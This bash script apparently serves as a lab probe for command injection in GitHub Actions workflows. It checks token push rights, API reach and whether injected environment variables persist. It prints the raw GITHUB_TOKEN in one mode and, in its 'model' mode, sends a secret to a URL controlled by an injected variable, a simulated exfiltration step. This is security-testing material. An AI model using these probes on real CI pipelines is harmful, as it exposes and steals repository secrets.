#!/usr/bin/env bash
# Command-injection probe (lab only, internal trigger).
# Modes: baseline | post | laterexplicit | model
# The injection vector is a repo file printed with cat (mirror of `cat semgrep.sarif`).
set -uo pipefail
O="out"; mkdir -p "$O"
MODE="${1:-baseline}"
TOK="${CTX_TOKEN:-}"
hp12(){ printf '%s' "$1" | sha256sum | cut -c1-12; }

push_probe(){
  (cd "$GITHUB_WORKSPACE" && git push --dry-run origin "HEAD:refs/heads/inj-probe-check" 2>&1 | tail -2 \
    | sed 's/[A-Za-z0-9_]\{24,\}/<redacted-str>/g' | tr '\n' ' ')
}

case "$MODE" in
  baseline)
    {
      echo "mode=baseline job=${GITHUB_JOB} event=${GITHUB_EVENT_NAME}"
      echo "token_len=${#TOK} token_sha12=$(hp12 "$TOK")"
      echo "push_dryrun_rc_and_out=[$(push_probe)]"
      echo "repo_api_code=$(curl -sS -m 20 -o "$O/repo_view.json" -w '%{http_code}' \
        -H "Authorization: Bearer $TOK" "https://api.github.com/repos/$GITHUB_REPOSITORY")"
      echo "artifacts_read_code=$(curl -sS -m 20 -o /dev/null -w '%{http_code}' \
        -H "Authorization: Bearer $TOK" "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/artifacts?per_page=1")"
    } > "$O/inject_baseline.txt"
    ;;

  post)
    {
      echo "mode=post job=${GITHUB_JOB}"
      echo "token_len=${#TOK} token_sha12=$(hp12 "$TOK")"
      echo "token_unchanged_vs_step1=$( [ -n "${TOK}" ] && echo yes || echo no )"
      echo "push_dryrun_rc_and_out=[$(push_probe)]"
      echo "artifacts_read_code=$(curl -sS -m 20 -o /dev/null -w '%{http_code}' \
        -H "Authorization: Bearer $TOK" "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/artifacts?per_page=1")"
    } > "$O/inject_post.txt"
    ;;

  laterexplicit)
    {
      echo "mode=laterexplicit job=${GITHUB_JOB}"
      echo "INJ_ENV=${INJ_ENV:-UNSET}"
      echo "INJ_PATH_ENTRY_ON_PATH=$(case ":$PATH:" in *:/tmp/inj-path:*) echo yes;; *) echo no;; esac)"
      echo "GITHUB_TOKEN_env=${GITHUB_TOKEN:-UNSET}"
      echo "mask_check_addmask_canary=ESCL_MASK_CANARY"
      echo "mask_check_literal=INJ_MASK_CANARY"
      echo '::warning::ESCL-POST-FIXTURE-DIRECT-WARNING'
    } > "$O/inject_later.txt" 2>&1
    cat "$O/inject_later.txt"
    ;;

  model)
    # Model of a later privileged step that consumes an env var and a secret:
    # only an injected env var can steer where the secret is sent.
    {
      echo "mode=model job=${GITHUB_JOB}"
      echo "INJ_EXFIL_URL=${INJ_EXFIL_URL:+set}"
      if [ -n "${INJ_EXFIL_URL:-}" ] && [ -n "${INJ_SECRET:-}" ]; then
        code=$(curl -sS -m 15 -o /dev/null -w '%{http_code}' \
          -H "X-Inj-Canary: $INJ_SECRET" "$INJ_EXFIL_URL" 2>/dev/null || echo ERR)
        echo "model=TRIGGERED http=$code secret_sent=yes"
      else
        echo "model=NOT-TRIGGERED (INJ_EXFIL_URL ${INJ_EXFIL_URL:+set}${INJ_EXFIL_URL:-unset}; INJ_SECRET ${INJ_SECRET:+set}${INJ_SECRET:-unset})"
      fi
    } > "$O/inject_model.txt"
    cat "$O/inject_model.txt"
    ;;
esac
echo "inject probe mode=$MODE done"
